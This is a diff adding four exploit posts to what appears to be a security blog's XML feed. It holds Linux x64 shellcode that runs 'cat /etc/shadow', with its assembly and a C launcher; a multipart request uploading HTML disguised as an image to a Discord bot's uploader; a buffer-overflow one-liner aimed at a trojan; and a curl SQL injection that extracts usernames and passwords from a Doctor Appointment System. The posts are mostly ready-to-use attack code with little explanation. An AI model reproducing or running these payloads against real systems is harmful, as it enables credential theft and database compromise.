@@ -4,6 +4,106 @@
   
     
     <entry>
+      <title>Linux/x64 execve cat /etc/shadow Shellcode</title>
+      <link href="2021/02/11/Linux-x64-execve-cat-etc-shadow-Shellcode/"/>
+      <url>2021/02/11/Linux-x64-execve-cat-etc-shadow-Shellcode/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Linux-x64-execve-cat-etc-shadow-Shellcode"><a href="#Linux-x64-execve-cat-etc-shadow-Shellcode" class="headerlink" title="Linux/x64 execve cat /etc/shadow Shellcode"></a>Linux/x64 execve cat /etc/shadow Shellcode</h4><p>66 bytes small Linux/x64 execve “cat /etc/shadow” shellcode.</p><p>Poc:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">global _start</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">_start:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       xor rax, rax                   ; Zeroes out RAX.</span><br><span class="hljs-comment">       xor rbp, rbp                   ; Zeroes out RBP.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rbp, 0x776f646168732f63    ; Moves value &quot;wodahs/c&quot; into RBP.</span><br><span class="hljs-comment">       push rbp                       ; Pushes the vaueof RBP into the Stack.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rbp, 0x74652f2f2f2f2f2f    ; Moves value &quot;te//////&quot; into RBP.</span><br><span class="hljs-comment">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rbp, rsp                   ; Copies the value of the Stack into RBP.</span><br><span class="hljs-comment">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rbx, 0x7461632f6e69622f    ; Moves value &quot;tac/nib/&quot; into RBX.</span><br><span class="hljs-comment">       push rbx                       ; Pushes the vaue of RBX into the Stack.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rbx, rsp                   ; Copies the value of the Stack into RBX.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rdi, rsp                   ; Copies the value of the Stack into RDI.</span><br><span class="hljs-comment">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rdx, rsp                   ; Copies the value of the Stack into RDX. As the previous DWORD was completely NULL, RDX is set to 0.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="hljs-comment">       push rbx                       ; Pushes the vaue of RBX into the Stack. The full string should be &quot;cat /etc/shadow&quot;.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       mov rsi, rsp                   ; Copies this entire string from the Stack into RSI.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       push word 59                   ; Pushes the value 59 (syscall value for execve in the x64 format).</span><br><span class="hljs-comment">       pop ax                         ; Pops this value into AX so there are no NULLs.</span><br><span class="hljs-comment">       syscall                        ; The syscall is executed.</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Usage:</span><br><span class="hljs-comment">whitecr0wz@SLAE64:~/assembly/execve/cat$ gcc cat_shadow.c -o cat_shadow -fno-stack-protector -z execstack -w</span><br><span class="hljs-comment">whitecr0wz@SLAE64:~/assembly/execve/cat$ ./cat_shadow</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = \<br><span class="hljs-string">&quot;\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">int</span> (*ret)() = (<span class="hljs-keyword">int</span>(*)())shellcode;<br>    ret();<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Shellcode </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> execve cat /etc/shadow Shellcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Discord Probot Arbitrary File Upload</title>
+      <link href="2021/02/11/Discord-Probot-Arbitrary-File-Upload/"/>
+      <url>2021/02/11/Discord-Probot-Arbitrary-File-Upload/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Discord-Probot-Arbitrary-File-Upload"><a href="#Discord-Probot-Arbitrary-File-Upload" class="headerlink" title="Discord Probot Arbitrary File Upload"></a>Discord Probot Arbitrary File Upload</h4><p>Discord Probot suffers from an arbitrary file upload vulnerability.</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"># PoC:<br><br><br>POST / HTTP/1.1<br>Host: uploader.probot.io<br>Accept: application/json, text/plain, */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: multipart/form-data; boundary=---------------------------<br>Content-Length: 333<br>Origin: https://probot.io<br>DNT: 1<br>Connection: close<br>Referer: https://probot.io/server/&quot;&quot;/welcomer<br><br>-----------------------------<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ste.html.jpg&quot;<br>Content-Type: text/html<br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>bypasss<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>bypass<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br>-------------------------------<br><br>Note:the link of the file will be generated depend on the content type in this case .html<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> File Upload </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan.Win32.Cafelom.bu Heap Corruption</title>
+      <link href="2021/02/11/Trojan-Win32-Cafelom-bu-Heap-Corruption/"/>
+      <url>2021/02/11/Trojan-Win32-Cafelom-bu-Heap-Corruption/</url>
+      
+        <content type="html"><![CDATA[<hr><h4 id="Trojan-Win32-Cafelom-bu-Heap-Corruption"><a href="#Trojan-Win32-Cafelom-bu-Heap-Corruption" class="headerlink" title="Trojan.Win32.Cafelom.bu Heap Corruption"></a>Trojan.Win32.Cafelom.bu Heap Corruption</h4><p>Trojan.Win32.Cafelom.bu malware suffers from a heap corruption vulnerability.</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">Exploit/<span class="hljs-attr">PoC:</span><br>python -c <span class="hljs-string">&quot;print(&#x27;A&#x27;*1000000)&quot;</span> &gt; <span class="hljs-attr">c:</span>\GamePath.txt<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Heap Corruption </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Doctor Appointment System 1.0 SQL Injection</title>
+      <link href="2021/02/11/Doctor-Appointment-System-1-0-SQL-Injection/"/>
+      <url>2021/02/11/Doctor-Appointment-System-1-0-SQL-Injection/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Doctor-Appointment-System-1-0-SQL-Injection"><a href="#Doctor-Appointment-System-1-0-SQL-Injection" class="headerlink" title="Doctor Appointment System 1.0 SQL Injection"></a>Doctor Appointment System 1.0 SQL Injection</h4><p>Doctor Appointment System version 1.0 suffers from a remote SQL injection vulnerability.</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">POC:<br>----<br><span class="hljs-number">1</span>] Login <span class="hljs-keyword">as</span> a normal patient user<br><span class="hljs-number">2</span>] Insert cookie after successful login <span class="hljs-keyword">in</span> the below command:<br>curl -i -s -o tmp -k -X $<span class="hljs-string">&#x27;POST&#x27;</span> \<br>    -H $<span class="hljs-string">&#x27;Host: 192.168.1.12&#x27;</span> -H $<span class="hljs-string">&#x27;Content-Type:</span><br><span class="hljs-string">application/x-www-form-urlencoded&#x27;</span> -H $<span class="hljs-string">&#x27;Content-Length: 288&#x27;</span> -H<br>$<span class="hljs-string">&#x27;Connection: close&#x27;</span> -H $<span class="hljs-string">&#x27;Cookie: PHPSESSID=b85jccq5ns65d75g69j2uj37hf&#x27;</span> -H<br>$<span class="hljs-string">&#x27;Upgrade-Insecure-Requests: 1&#x27;</span> \<br>    -b $<span class="hljs-string">&#x27;PHPSESSID=b85jccq5ns65d75g69j2uj37hf&#x27;</span> \<br>    --data-binary<br>$<span class="hljs-string">&#x27;expertise=Bone\&#x27;</span>+<span class="hljs-keyword">union</span>+select<span class="hljs-built_in">+concat</span>(\<span class="hljs-string">&#x27;Username-\&#x27;</span>,username),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(select+(<span class="hljs-meta">%40a</span>)+from+(select(<span class="hljs-meta">%40a</span><span class="hljs-meta">%3a</span><span class="hljs-meta">%3d0x00</span>),(select+(<span class="hljs-meta">%40a</span>)+from+(information_schema.schemata)<span class="hljs-keyword">where</span>+(<span class="hljs-meta">%40a</span>)<span class="hljs-keyword">in</span>+(<span class="hljs-meta">%40a</span><span class="hljs-meta">%3a</span><span class="hljs-meta">%3dconcat</span>(<span class="hljs-meta">%40a</span>,schema_name,\<span class="hljs-string">&#x27;&lt;br&gt;\&#x27;</span>))))a)<span class="hljs-built_in">,concat</span>(\<span class="hljs-string">&#x27;Password\&#x27;</span>,\<span class="hljs-string">&#x27;-\&#x27;</span>,password),<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>+from+users<span class="hljs-meta">%23</span>&amp;submit=<span class="hljs-string">&#x27;</span><br><span class="hljs-string">\</span><br><span class="hljs-string">    $&#x27;</span>http://host/patient/search_result.php<span class="hljs-string">&#x27;</span><br><span class="hljs-string">3] Check the tmp file for sensitive information from the database.</span><br><span class="hljs-string">------------------</span><br><span class="hljs-string"></span><br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL Injection </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Trojan-Spy.Win32.SpyEyes.auwl Insecure Permissions</title>
       <link href="2021/02/09/Trojan-Spy-Win32-SpyEyes-auwl-Insecure-Permissions/"/>
       <url>2021/02/09/Trojan-Spy-Win32-SpyEyes-auwl-Insecure-Permissions/</url>
